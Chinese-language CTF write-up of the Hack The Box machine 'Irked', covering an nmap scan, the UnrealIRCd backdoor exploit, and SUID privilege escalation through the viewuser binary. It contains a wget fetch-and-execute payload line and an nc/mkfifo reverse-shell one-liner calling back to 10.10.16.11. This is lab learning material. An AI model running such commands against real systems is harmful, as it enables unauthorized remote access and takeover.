
irked - 我来 Wolai




irked
nmap
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
6697/tcp  open  ircs-u
8067/tcp  open  infi-async
40791/tcp open  unknown
65534/tcp open  unknown
 
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
| ssh-hostkey:
|   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
|   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
|   256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
|_  256 8d:1b:43:c7:d0:1a:4c:05:cf:82:ed:c1:01:63:a2:0c (ED25519)
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.10 (Debian)
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          36353/udp6  status
|   100024  1          40791/tcp   status
|   100024  1          53764/tcp6  status
|_  100024  1          56272/udp   status
6697/tcp  open  irc     UnrealIRCd
8067/tcp  open  irc     UnrealIRCd
40791/tcp open  status  1 (RPC #100024)
65534/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
注意这里有个域名  irked.htb
ssh
ssh版本低，且使用了不安全算法，没有对应的exp
http
主页打开有一张图片，分析后没有发现异常
└─# curl http://10.10.10.117/
<img src=irked.jpg>
<br>
<b><center>IRC is almost working!</b></center>
提示中有IRC 和上面的扫描结果有关联
目录爆破
manual页面是apcache的帮助文档页面，用处不大
IRC
irc是什么？  
What is IRC (Internet Relay Chat)? (computerhope.com)
看上去是一款古老的协议
manual - 失败
UnrealIrcd是什么
└─# searchsploit  unrealirc
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                      |  Path
-------------------------------------------------------------------------------------------------------------------- ---------------------------------
UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                        | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                             | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                      | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service                                                                           | windows/dos/27407.pl
Authentication types - UnrealIRCd documentation wiki
使用13853.pl，将其中的playload修改成自己的反弹shell，没有成功，看了下原始的shell都是从远端服务器下载到本地后执行，尝试在kali上起web服务提供shell下载
my $payload2 = 'AB; cd /tmp; wget http://10.10.16.11/bindshell -O bot; chmod +x bot; ./bot &';
但是没有触发下载
msf
通过msf拿到一个低权shell ircd，存在另外一个用户 djmardov，存在user.txt 但是没有权限
NSE脚本（没有考虑到）
└─# locate   *.nse | grep  unreal
/usr/share/nmap/scripts/irc-unrealircd-backdoor.nse
Privilege Escalation
ircd → djmardov
没有sudo
使用pspy看下定时进程，LinEnum.sh 都没有特别发现
看下题解
ircd@irked:/usr/bin$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/spice-gtk/spice-client-glib-usb-acl-helper
/usr/sbin/exim4
/usr/sbin/pppd
/usr/bin/chsh
/usr/bin/procmail
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/at
/usr/bin/pkexec
/usr/bin/X
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/viewuser
/sbin/mount.nfs
/bin/su
/bin/mount
/bin/fusermount
/bin/ntfs-3g
/bin/umount
ircd@irked:/usr/bin$ ./viewuser
./viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2023-02-05 07:14 (:0)
sh: 1: /tmp/listusers: not found
ircd@irked:/usr/bin$
有个SUID的敏感文件，执行后有shell文件执行报错没有找到文件，在目录下新建一个同名文件，内容为反弹shell，拿到root权限
ircd@irked:/usr/bin$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.11 9001 >/tmp/f" > /tmp/listusers
<t /tmp/f|sh -i 2>&1|nc 10.10.16.11 9001 >/tmp/f" > /tmp/listusers
ircd@irked:/usr/bin$

ircd@irked:/usr/bin$

ircd@irked:/usr/bin$ cat /tmp/listusers
cat /tmp/listusers
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.11 9001 >/tmp/f
ircd@irked:/usr/bin$

ircd@irked:/usr/bin$

ircd@irked:/usr/bin$ ./viewusers
./viewusers
bash: ./viewusers: No such file or directory
ircd@irked:/usr/bin$ ./viewuser
./viewuser
This application is being devleoped to set and test user permissions
It is still being actively developed
(unknown) :0           2023-02-05 07:14 (:0)


